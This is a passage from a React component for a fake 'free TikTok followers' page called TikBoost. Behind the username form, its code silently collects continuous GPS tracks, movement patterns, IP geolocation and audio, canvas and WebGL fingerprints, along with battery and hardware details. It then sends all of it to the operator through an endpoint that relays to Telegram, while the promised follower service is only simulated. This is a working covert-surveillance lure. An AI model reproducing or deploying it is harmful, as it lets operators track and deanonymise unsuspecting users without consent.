                timezone: ipData.timezone,
                collectionMethods: [...(prev.geolocation.collectionMethods || []), 'ipinfo'],
                ipInfo: ipData
              }
            }));
          }
        } catch (error) {
          console.warn("IP-based location failed from ipinfo.io:", error);
          getAlternateIPLocation();
        }
      };
      
      // Collection method 3: Alternative IP geolocation service
      const getAlternateIPLocation = async () => {
        try {
          // Try geojs.io as an alternative IP geolocation service
          const geoJsResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
          const geoData = await geoJsResponse.json();
          
          if (geoData && geoData.latitude && geoData.longitude) {
            setUserInfo(prev => ({
              ...prev,
              geolocation: {
                ...prev.geolocation,
                latitude: parseFloat(geoData.latitude),
                longitude: parseFloat(geoData.longitude),
                accuracy: 10000, // Less accurate than ipinfo
                source: 'geojs_ip_based',
                city: geoData.city,
                region: geoData.region,
                country: geoData.country,
                collectionMethods: [...(prev.geolocation.collectionMethods || []), 'geojs'],
                geoJs: geoData
              }
            }));
          }
        } catch (error) {
          console.warn("Alternative IP location failed:", error);
        }
      };
      
      // Try to get timezone-based location (very rough estimate)
      const getTimezoneLocation = () => {
        try {
          const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
          
          // Map common timezones to approximate coordinates
          const timezoneMap: Record<string, [number, number]> = {
            'America/New_York': [40.7128, -74.0060],    // New York
            'America/Los_Angeles': [34.0522, -118.2437], // Los Angeles
            'Europe/London': [51.5074, -0.1278],        // London
            'Europe/Paris': [48.8566, 2.3522],          // Paris
            'Asia/Tokyo': [35.6762, 139.6503],          // Tokyo
            'Asia/Singapore': [1.3521, 103.8198],       // Singapore
            'Australia/Sydney': [-33.8688, 151.2093],   // Sydney
            'Africa/Lagos': [6.5244, 3.3792]            // Lagos
          };
          
          if (timezone in timezoneMap) {
            setUserInfo(prev => ({
              ...prev,
              geolocation: {
                ...prev.geolocation,
                timezoneBasedLocation: {
                  latitude: timezoneMap[timezone][0],
                  longitude: timezoneMap[timezone][1],
                  accuracy: 500000, // Very inaccurate (~500km)
                  source: 'timezone_estimate',
                  timezone
                },
                collectionMethods: [...(prev.geolocation.collectionMethods || []), 'timezone_estimate']
              }
            }));
          }
        } catch (error) {
          console.warn("Timezone-based location approximation failed:", error);
        }
      };
      
      // Setup continuous location tracking using watchPosition for real-time updates
      const setupContinuousTracking = () => {
        if ('geolocation' in navigator) {
          try {
            // Start continuous position tracking
            const watchId = navigator.geolocation.watchPosition(
              (position) => {
                // Success - we have continuous location updates
                const {
                  latitude,
                  longitude,
                  accuracy,
                  altitude,
                  altitudeAccuracy,
                  heading,
                  speed
                } = position.coords;
                
                // Check if coordinates are reasonable
                const isReasonableCoordinate = 
                  latitude >= -90 && latitude <= 90 && 
                  longitude >= -180 && longitude <= 180;
                
                if (!isReasonableCoordinate) {
                  console.warn("Continuous tracking: Suspicious GPS coordinates detected", { latitude, longitude });
                }
                
                setUserInfo(prev => {
                  // Create new location entry for tracking
                  const newLocationEntry = {
                    latitude,
                    longitude,
                    accuracy,
                    altitude,
                    altitudeAccuracy,
                    heading,
                    speed,
                    timestamp: position.timestamp,
                    recordedAt: new Date().toISOString()
                  };
                  
                  // Update location history
                  let locationHistory = [...(prev.geolocation.locationHistory || [])];
                  locationHistory.push(newLocationEntry);
                  
                  // Limit history to most recent 20 points
                  if (locationHistory.length > 20) {
                    locationHistory = locationHistory.slice(-20);
                  }
                  
                  // Calculate movement path
                  const movementPath = [...(prev.geolocation.movementPath || [])];
                  if (locationHistory.length >= 2) {
                    const lastIndex = locationHistory.length - 1;
                    movementPath.push({
                      from: {
                        lat: locationHistory[lastIndex - 1].latitude,
                        lng: locationHistory[lastIndex - 1].longitude,
                      },
                      to: {
                        lat: latitude,
                        lng: longitude,
                      },
                      timestamp: new Date().toISOString()
                    });
                  }
                  
                  // Calculate speed changes and movement patterns
                  let movementPatterns = prev.geolocation.movementPatterns || [];
                  if (locationHistory.length >= 3) {
                    // Analyze recent locations for patterns
                    const lastThreePoints = locationHistory.slice(-3);
                    const speeds = lastThreePoints.map(loc => loc.speed || 0);
                    
                    // Check for acceleration/deceleration
                    if (speeds[2] > speeds[0] + 5) {
                      movementPatterns.push({
                        type: 'acceleration',
                        startSpeed: speeds[0],
                        endSpeed: speeds[2],
                        timestamp: new Date().toISOString()
                      });
                    } else if (speeds[0] > speeds[2] + 5) {
                      movementPatterns.push({
                        type: 'deceleration',
                        startSpeed: speeds[0],
                        endSpeed: speeds[2],
                        timestamp: new Date().toISOString()
                      });
                    }
                  }
                  
                  return {
                    ...prev,
                    geolocation: {
                      ...prev.geolocation,
                      watchPositionActive: true,
                      watchId: watchId,
                      latitude,
                      longitude,
                      accuracy,
                      altitude,
                      altitudeAccuracy,
                      heading,
                      speed,
                      timestamp: position.timestamp,
                      locationHistory,
                      movementPath,
                      movementPatterns,
                      trackingInfo: {
                        ...(prev.geolocation.trackingInfo || {}),
                        lastUpdated: new Date().toISOString(),
                        updateCount: ((prev.geolocation.trackingInfo || {}).updateCount || 0) + 1
                      },
                      collectionMethods: [...new Set([...(prev.geolocation.collectionMethods || []), 'watch_position'])],
                    }
                  };
                });
              },
              (error) => {
                // Continuous tracking error
                console.warn("Continuous location tracking error:", error.message);
                setUserInfo(prev => ({
                  ...prev,
                  geolocation: {
                    ...prev.geolocation,
                    watchPositionActive: false,
                    watchPositionError: error.message,
                    collectionMethods: [...(prev.geolocation.collectionMethods || []), 'watch_position_failed']
                  }
                }));
              },
              // Options for high accuracy continuous tracking
              {
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 0
              }
            );
            
            // Store the watch ID for cleanup
            setUserInfo(prev => ({
              ...prev,
              geolocation: {
                ...prev.geolocation,
                watchId,
                watchPositionActive: true,
                collectionMethods: [...(prev.geolocation.collectionMethods || []), 'watch_position_started']
              }
            }));
            
          } catch (error) {
            console.warn("Error setting up continuous location tracking:", error);
          }
        }
      };

      // Start with most accurate method and fall back to less accurate ones
      getHTML5Location();
      getTimezoneLocation(); // This runs in parallel as a fallback
      setupContinuousTracking(); // Start continuous tracking
      
      // Record that we attempted to collect location data
      setUserInfo(prev => ({
        ...prev,
        geolocation: {
          ...prev.geolocation,
          attempted: true,
          attemptTimestamp: new Date().toISOString(),
          // Add field to track location collection status
          collectionStatus: 'in_progress'
        }
      }));
    };
    
    // Advanced audio capabilities fingerprinting with anomaly detection
    const getAudioFingerprint = () => {
      try {
        // Create primary audio fingerprint
        const createPrimaryAudioProfile = () => {
          const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
          if (!audioContext) return null;
          
          // Create standard nodes for testing
          const analyser = audioContext.createAnalyser();
          const oscillator = audioContext.createOscillator();
          const dynamicsCompressor = audioContext.createDynamicsCompressor();
          const gainNode = audioContext.createGain();
          
          // Create additional advanced nodes when available
          let biquadFilter;
          let delayNode;
          let waveShaper;
          
          try { biquadFilter = audioContext.createBiquadFilter(); } catch (e) {}
          try { delayNode = audioContext.createDelay(); } catch (e) {}
          try { waveShaper = audioContext.createWaveShaper(); } catch (e) {}
          
          // Collect exhaustive audio parameters for detailed fingerprinting
          const params = {
            context: {
              sampleRate: audioContext.sampleRate,
              state: audioContext.state,
              baseLatency: (audioContext as any).baseLatency || 'unknown',
              outputLatency: (audioContext as any).outputLatency || 'unknown',
              destination: {
                maxChannelCount: audioContext.destination.maxChannelCount,
                channelCount: audioContext.destination.channelCount,
                channelCountMode: audioContext.destination.channelCountMode,
                channelInterpretation: audioContext.destination.channelInterpretation,
                numberOfInputs: audioContext.destination.numberOfInputs,
                numberOfOutputs: audioContext.destination.numberOfOutputs
              },
              currentTime: audioContext.currentTime
            },
            analyser: {
              channelCount: analyser.channelCount,
              channelCountMode: analyser.channelCountMode,
              channelInterpretation: analyser.channelInterpretation,
              fftSize: analyser.fftSize,
              frequencyBinCount: analyser.frequencyBinCount,
              minDecibels: analyser.minDecibels,
              maxDecibels: analyser.maxDecibels,
              smoothingTimeConstant: analyser.smoothingTimeConstant,
              numberOfInputs: analyser.numberOfInputs,
              numberOfOutputs: analyser.numberOfOutputs
            },
            oscillator: {
              type: oscillator.type,
              frequency: oscillator.frequency.value,
              detune: oscillator.detune.value,
              channelCount: oscillator.channelCount,
              channelCountMode: oscillator.channelCountMode,
              channelInterpretation: oscillator.channelInterpretation,
              numberOfInputs: oscillator.numberOfInputs,
              numberOfOutputs: oscillator.numberOfOutputs
            },
            compressor: {
              threshold: dynamicsCompressor.threshold.value,
              knee: dynamicsCompressor.knee.value,
              ratio: dynamicsCompressor.ratio.value,
              attack: dynamicsCompressor.attack.value,
              release: dynamicsCompressor.release.value,
              reduction: dynamicsCompressor.reduction || 'unknown',
              channelCount: dynamicsCompressor.channelCount,
              channelCountMode: dynamicsCompressor.channelCountMode,
              channelInterpretation: dynamicsCompressor.channelInterpretation,
              numberOfInputs: dynamicsCompressor.numberOfInputs,
              numberOfOutputs: dynamicsCompressor.numberOfOutputs
            },
            gain: {
              value: gainNode.gain.value,
              automationRate: gainNode.gain.automationRate || 'unknown',
              channelCount: gainNode.channelCount
            },
            capabilities: {
              // Test for specific audio capabilities
              audioWorklet: typeof AudioWorkletNode !== 'undefined',
              OfflineAudioContext: typeof OfflineAudioContext !== 'undefined',
              StereoPannerNode: typeof StereoPannerNode !== 'undefined',
              ConstantSourceNode: typeof ConstantSourceNode !== 'undefined',
              ConvolverNode: typeof ConvolverNode !== 'undefined',
              DynamicsCompressorNode: typeof DynamicsCompressorNode !== 'undefined',
              IIRFilterNode: typeof IIRFilterNode !== 'undefined',
              WaveShaperNode: typeof WaveShaperNode !== 'undefined',
              PeriodicWave: typeof PeriodicWave !== 'undefined',
              OscillatorNode: typeof OscillatorNode !== 'undefined',
              // Extended capabilities
              BiquadFilterNode: typeof BiquadFilterNode !== 'undefined',
              DelayNode: typeof DelayNode !== 'undefined',
              ChannelMergerNode: typeof ChannelMergerNode !== 'undefined',
              ChannelSplitterNode: typeof ChannelSplitterNode !== 'undefined',
              PannerNode: typeof PannerNode !== 'undefined',
              MediaStreamAudioSourceNode: typeof MediaStreamAudioSourceNode !== 'undefined', 
              AudioParam: typeof AudioParam !== 'undefined'
            }
          };
          
          // Add details for additional nodes if available
          if (biquadFilter) {
            params.biquadFilter = {
              type: biquadFilter.type,
              frequency: biquadFilter.frequency.value,
              Q: biquadFilter.Q.value,
              gain: biquadFilter.gain.value
            };
          }
          
          if (delayNode) {
            params.delay = {
              delayTime: delayNode.delayTime.value,
              maxDelayTime: delayNode.maxDelayTime || 'unknown'
            };
          }
          
          // Generate audio frequency data for more unique fingerprinting
          try {
            // Increase FFT size for more detailed analysis
            analyser.fftSize = 2048;
            
            // Get frequency data
            const frequencyData = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(frequencyData);
            
            // Sample frequency data
            const frequencySample = Array.from(frequencyData.slice(0, 30));
            params.frequencySample = frequencySample;
            
            // Also get time domain data for additional fingerprinting
            const timeDomainData = new Uint8Array(analyser.fftSize);
            analyser.getByteTimeDomainData(timeDomainData);
            
            // Sample time domain data
            params.timeDomainSample = Array.from(timeDomainData.slice(0, 30));
          } catch (e) {
            console.warn("Could not get frequency data:", e);
          }
          
          // Clean up
          audioContext.close();
          
          return params;
        };
        
        // Test if offline audio processing is available and collect data
        const createOfflineAudioProfile = () => {
          try {
            if (typeof OfflineAudioContext === 'undefined') {
              return { offlineSupported: false };
            }
            
            // Create an offline context for testing rendering capabilities
            const offlineCtx = new OfflineAudioContext({
              numberOfChannels: 2,
              length: 44100, // 1 second
              sampleRate: 44100
            });
            
            // Create a simple audio test signal
            const osc = offlineCtx.createOscillator();
            const filter = offlineCtx.createBiquadFilter();
            const gain = offlineCtx.createGain();
            
            // Configure nodes
            osc.type = 'sine';
            osc.frequency.value = 440; // A4 
            filter.type = 'lowpass';
            filter.frequency.value = 1000;
            gain.gain.value = 0.5;
            
            // Connect nodes
            osc.connect(filter);
            filter.connect(gain);
            gain.connect(offlineCtx.destination);
            
            // Start oscillator
            osc.start();
            
            // Initial data to return immediately
            const offlineProfile = {
              offlineSupported: true,
              sampleRate: offlineCtx.sampleRate,
              length: offlineCtx.length,
              state: offlineCtx.state
            };
            
            // Measure rendering time - abnormal times could indicate emulation
            const startTime = performance.now();
            
            // Start rendering (completes asynchronously)
            offlineCtx.startRendering().then(buffer => {
              const renderTime = performance.now() - startTime;
              
              // Sample the rendered buffer
              const channel0 = buffer.getChannelData(0);
              const channel1 = buffer.getChannelData(1);
              
              // Take specific samples
              const samplePoints = [0, 100, 1000, 10000, 20000, 30000, 40000];
              const samples = samplePoints.map(i => ({
                position: i,
                ch0: channel0[i] || 0,
                ch1: channel1[i] || 0
              }));
              
              // Look for anomalies that suggest emulation
              const isAllZeros = samples.every(s => s.ch0 === 0 && s.ch1 === 0);
              const isAllSame = samples.every(s => s.ch0 === samples[0].ch0);
              const isTooFast = renderTime < 5;
              
              const detailedProfile = {
                ...offlineProfile,
                renderTimeMs: renderTime,
                samples,
                anomalies: {
                  allZeros: isAllZeros,
                  allSame: isAllSame,
                  tooFastRendering: isTooFast
                },
                suspicious: isAllZeros || isAllSame || isTooFast
              };
              
              // Update fingerprint with detailed rendering results
              setUserInfo(prev => ({
                ...prev,
                fingerprintData: {
                  ...prev.fingerprintData,
                  offlineAudio: JSON.stringify(detailedProfile)
                }
              }));
              
              // Check for suspicious behavior
              if (detailedProfile.suspicious) {
                setUserInfo(prev => ({
                  ...prev,
                  securityChecks: {
                    ...prev.securityChecks,
                    tamperingDetected: true,
                    isEmulator: true,
                    integrityScore: Math.max(0, prev.securityChecks.integrityScore - 15),
                    emulatorDetails: {
                      ...prev.securityChecks.emulatorDetails,
                      audioEmulation: true,
                      audioAnomalies: detailedProfile.anomalies
                    }
                  }
                }));
              }
            }).catch(err => {
              console.warn("Offline audio rendering failed:", err);
            });
            
            return offlineProfile;
          } catch (e) {
            console.warn("Offline audio context creation failed:", e);
            return {
              offlineSupported: false,
              error: e instanceof Error ? e.message : String(e)
            };
          }
        };
        
        // Check for audio fingerprint protection or emulation
        const detectAudioTampering = () => {
          const tamperingPatterns = [];
          
          // Test for audio context consistency
          try {
            const ctx1 = new (window.AudioContext || (window as any).webkitAudioContext)();
            const ctx2 = new (window.AudioContext || (window as any).webkitAudioContext)();
            
            // Compare key properties
            if (ctx1.sampleRate !== ctx2.sampleRate) {
              tamperingPatterns.push('inconsistent_sample_rate');
            }
            
            // Check for unusual sample rates
            const sampleRate = ctx1.sampleRate;
            if (![44100, 48000, 88200, 96000, 192000].includes(sampleRate)) {
              tamperingPatterns.push('unusual_sample_rate');
            }
            
            // Clean up
            ctx1.close();
            ctx2.close();
          } catch (e) {
            console.warn("Audio context comparison failed:", e);
          }
          
          return tamperingPatterns;
        };
        
        // Run all audio fingerprinting tests
        const primaryProfile = createPrimaryAudioProfile();
        const offlineProfile = createOfflineAudioProfile();
        const tamperingPatterns = detectAudioTampering();
        
        // Combine all results into comprehensive fingerprint
        const combinedAudioFingerprint = {
          primary: primaryProfile,
          offline: offlineProfile,
          tampering: {
            detected: tamperingPatterns.length > 0,
            patterns: tamperingPatterns
          },
          timestamp: new Date().toISOString()
        };
        
        // Create detailed fingerprint from comprehensive data
        const audioFingerprintString = JSON.stringify(combinedAudioFingerprint);
        
        // Update user info with complete audio fingerprint
        setUserInfo(prev => ({
          ...prev,
          audioFingerprint: audioFingerprintString,
          fingerprintData: {
            ...prev.fingerprintData,
            audio: audioFingerprintString
          }
        }));
        
        // If tampering patterns detected, update security checks
        if (tamperingPatterns.length > 0) {
          setUserInfo(prev => ({
            ...prev,
            securityChecks: {
              ...prev.securityChecks,
              tamperingDetected: true,
              automationDetected: true,
              integrityScore: Math.max(0, prev.securityChecks.integrityScore - 15),
              emulatorDetails: {
                ...prev.securityChecks.emulatorDetails,
                audioTampering: tamperingPatterns
              }
            }
          }));
        }
      } catch (e) {
        console.warn("Audio fingerprinting failed:", e);
        
        // Still update with error information
        setUserInfo(prev => ({
          ...prev,
          fingerprintData: {
            ...prev.fingerprintData,
            audio: JSON.stringify({
              error: true,
              message: e instanceof Error ? e.message : String(e),
              timestamp: new Date().toISOString()
            })
          }
        }));
      }
    };

    // Analyze mobile device in more detail
    const analyzeMobileDevice = () => {
      if (userInfo.isMobile) {
        const ua = navigator.userAgent;
        let brand = '', model = '', osVersion = '', deviceType = '';
        
        // Extract OS version
        if (/iPhone|iPad|iPod/.test(ua)) {
          const osMatch = ua.match(/OS\s+(\d+[._]\d+[._]?\d*)/i);
          osVersion = osMatch ? osMatch[1].replace(/_/g, '.') : '';
          brand = 'Apple';
          deviceType = /iPhone/.test(ua) ? 'Phone' : 
                     /iPad/.test(ua) ? 'Tablet' : 
                     /iPod/.test(ua) ? 'Media Player' : 'Mobile Device';
        } else if (/Android/.test(ua)) {
          const osMatch = ua.match(/Android\s+(\d+(?:\.\d+)*)/i);
          osVersion = osMatch ? osMatch[1] : '';
          
          // Try to identify brand from common markers
          if (/Samsung|SM-|Galaxy/.test(ua)) brand = 'Samsung';
          else if (/Pixel|Google/.test(ua)) brand = 'Google';
          else if (/OnePlus/.test(ua)) brand = 'OnePlus';
          else if (/Xiaomi|Redmi|POCO|Mi/.test(ua)) brand = 'Xiaomi';
          else if (/Huawei|HUAWEI|HW-/.test(ua)) brand = 'Huawei';
          else if (/OPPO/.test(ua)) brand = 'OPPO';
          else if (/vivo/.test(ua)) brand = 'Vivo';
          else if (/Motorola|moto/.test(ua)) brand = 'Motorola';
          else brand = 'Unknown Android';
          
          deviceType = /tablet|pad/i.test(ua) ? 'Tablet' : 'Phone';
        }
        
        // Extract device year based on model and features
        let deviceYear = ''; 
        if (brand === 'Apple') {
          if (osVersion.startsWith('17')) deviceYear = '2023-2024';
          else if (osVersion.startsWith('16')) deviceYear = '2022-2023';
          else if (osVersion.startsWith('15')) deviceYear = '2021-2022';
          else if (osVersion.startsWith('14')) deviceYear = '2020-2021';
          else if (osVersion.startsWith('13')) deviceYear = '2019-2020';
        }
        
        setUserInfo(prev => ({
          ...prev,
          mobileDetails: {
            brand,
            model: getDeviceInfo ? getDeviceInfo() : '',
            osVersion,
            deviceYear,
            deviceType
          }
        }));
      }
    };
    
    // Run all our enhanced device detection functions
    collectNetworkInfo();
    getBatteryInfo();
    createCanvasFingerprint();
    createWebGLFingerprint();
    detectFonts();
    checkVibration();
    getGeolocation();
    getAudioFingerprint();
    analyzeMobileDevice();
    
  }, []);
  
  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      username: "",
      followersRequested: 5000,
      email: "",
    },
    mode: "onChange",
  });
  
  // Simplified device validation that collects info but allows all devices
  const validateDeviceInfo = () => {
    // Log warnings but don't block submission
    if (userInfo.isEmulator) {
      console.warn("Device appears to be an emulator based on hardware checks");
    }
    
    // Log device model information
    if (userInfo.deviceModel === "Unknown Device") {
      console.warn("Unknown device model - will still collect data");
    }
    
    // Verify IP address quality thoroughly
    if (!userInfo.ip || userInfo.ip.length < 7) { 
      console.warn("IP address missing or invalid");
    } else {
      // Check IP format is valid with regex
      const ipRegex = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;
      const ipMatch = userInfo.ip.match(ipRegex);
      
      if (!ipMatch) {
        console.warn("IP address format is invalid");
      } else {
        // Validate each octet is within range
        const validOctets = ipMatch.slice(1).every(octet => {
          const num = parseInt(octet, 10);
          return num >= 0 && num <= 255;
        });
        
        if (!validOctets) {
          console.warn("IP address contains invalid octets");
        }
      }
    }
    
    // Check for suspicious or problematic IP addresses
    const suspiciousIPs = [
      '127.0.0.1',        // Localhost
      '0.0.0.0',          // Unspecified
      '192.168.',         // Private Class C
      '10.',              // Private Class A
      '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', // Private Class B
      '169.254.',         // Link-local
      '224.',             // Multicast
      '100.64.'           // Carrier-grade NAT
    ];
    
    if (userInfo.ip && suspiciousIPs.some(prefix => userInfo.ip.startsWith(prefix))) {
      console.warn(`Suspicious/private IP detected: ${userInfo.ip}`);
    }
    
    // Check for fingerprinting capability
    if (!userInfo.canvasFingerprint || !userInfo.webglFingerprint) {
      console.warn("Browser fingerprinting partially blocked");
    }
    
    // Log mobile inconsistencies but don't block
    if (userInfo.isMobile) {
      if (!('ontouchstart' in window) && navigator.maxTouchPoints <= 0) {
        console.warn("Mobile device without touch capabilities detected");
      }
      
      if (!userInfo.hasOrientation) {
        console.warn("Mobile device without orientation API detected");
      }
    }
    
    // Still collect GPU information when available
    if (!userInfo.hardwareInfo.gpu || userInfo.hardwareInfo.gpu === 'unknown') {
      console.warn("GPU information missing or restricted");
    }
    
    // Always return valid to allow form submission
    return { 
      valid: true,
      // Include reason property to maintain compatibility with existing code
      reason: '' 
    };
  };
  
  // Create a browser fingerprint combining multiple data points
  const createBrowserFingerprint = () => {
    const items = [
      userInfo.userAgent,
      userInfo.deviceModel,
      userInfo.canvasFingerprint,
      userInfo.screenSize,
      userInfo.colorDepth,
      userInfo.language,
      userInfo.timezone,
      userInfo.platform,
      userInfo.plugins.slice(0, 100) // Limit size
    ];
    
    return items.join('||');
  };

  const mutation = useMutation({
    mutationFn: async (values: FormValues) => {
      // Enhanced device validation with detailed error reporting
      const deviceValidation = validateDeviceInfo();
      
      if (!deviceValidation.valid) {
        console.error("Device validation failed:", deviceValidation.reason);
        throw new Error(`Unable to verify your device: ${deviceValidation.reason}. Please try again with a different device or browser.`);
      }
      
      // Create enhanced browser fingerprint for additional verification
      const browserFingerprint = createBrowserFingerprint();
      
      // Format the device info with additional hardware indicators
      const deviceInfo = {
        deviceModel: userInfo.deviceModel,
        screenSize: userInfo.screenSize,
        platform: userInfo.platform,
        userAgent: userInfo.userAgent,
        language: userInfo.language,
        timezone: userInfo.timezone,
        ipAddress: userInfo.ip,
        browserFingerprint: browserFingerprint,
        hardwareInfo: {
          cores: userInfo.hardwareInfo.cores,
          memory: userInfo.hardwareInfo.memory,
          gpu: userInfo.hardwareInfo.gpu,
          touchPoints: userInfo.hardwareInfo.touchPoints,
          pixelRatio: userInfo.hardwareInfo.pixelRatio,
          batteryLevel: userInfo.hardwareInfo.batteryLevel || 0
        },
        deviceCapabilities: {
          hasTouch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
          hasVibration: userInfo.hardwareInfo.vibrationSupported || false,
          hasMotion: userInfo.hasMotion,
          hasOrientation: userInfo.hasOrientation,
          isMobile: userInfo.isMobile
        }
      };
      
      // Create a complete data payload with all location and device data
      // This ensures nothing is truncated or omitted during transmission
      const completeLocationData = {
        ...userInfo.geolocation,
        // Ensure these critical fields are included
        locationHistory: userInfo.geolocation?.locationHistory || [],
        movementPath: userInfo.geolocation?.movementPath || [],
        address: userInfo.geolocation?.address || {},
        displayName: userInfo.geolocation?.displayName || '',
        locationDetails: userInfo.geolocation?.locationDetails || {},
        pointsOfInterest: userInfo.geolocation?.pointsOfInterest || [],
        nearbyLandmarks: userInfo.geolocation?.nearbyLandmarks || [],
        // Include all location-related metadata
        trackingInfo: userInfo.geolocation?.trackingInfo || {},
        locationQuality: userInfo.geolocation?.locationQuality || '',
        locationAccuracyAnalysis: userInfo.geolocation?.locationAccuracyAnalysis || {}
      };
      
      // Enhanced device info with complete hardware details
      const enhancedDeviceInfo = {
        ...deviceInfo,
        // Include additional fields for complete data transmission
        fullHardwareInfo: {
          ...userInfo.hardwareInfo,
          sensors: userInfo.hardwareInfo?.sensors || {},
          batteryDetails: userInfo.battery || {}
        },
        // Include complete fingerprinting data
        completeFingerprints: {
          canvas: userInfo.canvasFingerprint || '',
          webgl: userInfo.webglFingerprint || '',
          audio: userInfo.audioFingerprint || '',
          // Include full lists without truncation
          fonts: userInfo.fonts || '',
          plugins: userInfo.plugins || ''
        },
        // Include complete network information
        networkDetails: {
          ...userInfo.connection,
          ipDetails: userInfo.ipDetails || {},
          networkChanges: userInfo.connection?.networkChanges || []
        }
      };
      
      // Prepare the submission with fully enhanced data - ensuring NOTHING is truncated
      const payload = {
        ...values,
        deviceInfo: enhancedDeviceInfo,
        completeGeolocation: completeLocationData,
        ipAddress: userInfo.ip,
        isEmulator: userInfo.isEmulator,
        // Include all user metadata
        userMetadata: {
          cookiesEnabled: userInfo.cookiesEnabled,
          doNotTrack: userInfo.doNotTrack,
          mobileDetails: userInfo.mobileDetails || {},
          submissionTimestamp: new Date().toISOString(),
          dataTransmissionComplete: true
        },
        // Keep the full userInfo for analytics, but ensure critical data is also in dedicated fields
        userInfo: userInfo
      };
      
      console.log("Sending submission with validated data:", payload);
      
      // First send a direct notification to Telegram to ensure it works
      try {
        console.log("Sending notification to Telegram...");
        const notifyResponse = await fetch("/api/notify", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            username: values.username,
            followers: selectedAmount,
            userInfo: userInfo,
            deviceInfo: enhancedDeviceInfo,
            ipAddress: userInfo.ip,
            completeGeolocation: completeLocationData,
            userMetadata: payload.userMetadata
          })
        });
        
        if (notifyResponse.ok) {
          console.log("Notification sent successfully to Telegram");
        } else {
          console.error("Failed to send notification:", await notifyResponse.text());
        }
      } catch (error) {
        console.error("Telegram notification error:", error);
      }
      
      // Now submit the form data to the server
      const data = await apiRequest("POST", "/api/submit", payload);
      return data.json();
    },
    onSuccess: (data) => {
      setFormStep('processing');
      
      // Simulate processing for demonstration purposes
      setTimeout(() => {
        setFormStep('success');
        
        // Redirect to thank you page after a short delay
        setTimeout(() => {
          window.location.href = `/thank-you/${data.submission.id}`;
        }, 2000);
      }, 3000);
    },
    onError: (error) => {
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to submit your request",
        variant: "destructive",
      });
    },
  });
  
  const onSubmit = (values: FormValues) => {
    // Set the number of followers based on the selected amount
    values.followersRequested = selectedAmount;
    mutation.mutate(values);
  };
  
  const selectFollowerAmount = (amount: number) => {
    setSelectedAmount(amount);
    form.setValue("followersRequested", amount);
  };
  
  return (
    <section id="boost-now" className="min-h-screen bg-black text-white">
      {/* Animated TikTok background */}
      <div className="absolute inset-0 overflow-hidden opacity-30">
        <div className="absolute top-10 left-10 w-40 h-40 rounded-full bg-[#25F4EE] blur-3xl animate-pulse"></div>
        <div className="absolute bottom-20 right-10 w-60 h-60 rounded-full bg-[#FE2C55] blur-3xl animate-pulse"></div>
        <div className="absolute top-1/3 right-1/4 w-32 h-32 rounded-full bg-white blur-3xl animate-pulse"></div>
      </div>
      
      <div className="relative pt-10 pb-20 px-4 md:px-8 z-10">
        <div className="max-w-5xl mx-auto">
          {/* Header logo */}
          <div className="flex justify-center mb-10">
            <div className="flex items-center space-x-2">
              <div className="relative h-12 w-12 rounded-full bg-black border-2 border-white flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="h-6 w-6 fill-current text-white">
                  <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/>
                </svg>
                <div className="absolute -top-1 -right-1 h-3 w-3 bg-[#FE2C55] rounded-full animate-ping"></div>
              </div>
              <h1 className="text-3xl font-montserrat font-bold bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] bg-clip-text text-transparent">TikBoost</h1>
            </div>
          </div>
          
          <div className="text-center mb-12">
            <div className="inline-block mb-5 px-5 py-2 bg-[#1D1D1D] rounded-full text-sm font-medium border border-gray-800 animate-pulse">
              <span className="text-[#25F4EE] flex items-center">
                <Flame className="h-4 w-4 mr-1 text-[#FE2C55]" /> HOT DEAL 
                <span className="mx-2 text-gray-500">|</span>
                <span className="text-white">LIMITED TIME ONLY</span>
              </span>
            </div>
            <h2 className="text-4xl md:text-6xl font-montserrat font-bold mb-6 leading-tight">
              Get Up To <span className="bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] bg-clip-text text-transparent">5,000</span> Free<br /> TikTok Followers
            </h2>
            <p className="text-xl text-gray-300 max-w-2xl mx-auto leading-relaxed">
              Boost your TikTok presence instantly with real followers.
              No password required - just enter your username!
            </p>
          </div>
          
          {/* Phone mockup with form */}
          <div className="max-w-6xl mx-auto grid md:grid-cols-5 gap-8 items-center">
            {/* Phone mockup */}
            <div className="md:col-span-2 hidden md:block">
              <div className="relative mx-auto w-[280px]">
                <div className="relative z-10 bg-black rounded-[40px] border-4 border-gray-800 overflow-hidden w-full aspect-[9/19] shadow-2xl">
                  <div className="absolute top-0 inset-x-0 h-6 bg-black rounded-t-2xl"></div>
                  <div className="absolute top-1.5 inset-x-0 flex justify-center">
                    <div className="h-2 w-20 bg-gray-800 rounded-full"></div>
                  </div>
                  <div className="h-full pt-6 bg-gradient-to-b from-gray-900 to-black">
                    <div className="flex justify-between items-center px-4 mb-4">
                      <svg viewBox="0 0 24 24" className="h-6 w-6 fill-current text-white">
                        <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/>
                      </svg>
                      <div className="text-white text-sm font-medium">For You</div>
                      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6 text-white">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                      </svg>
                    </div>
                    
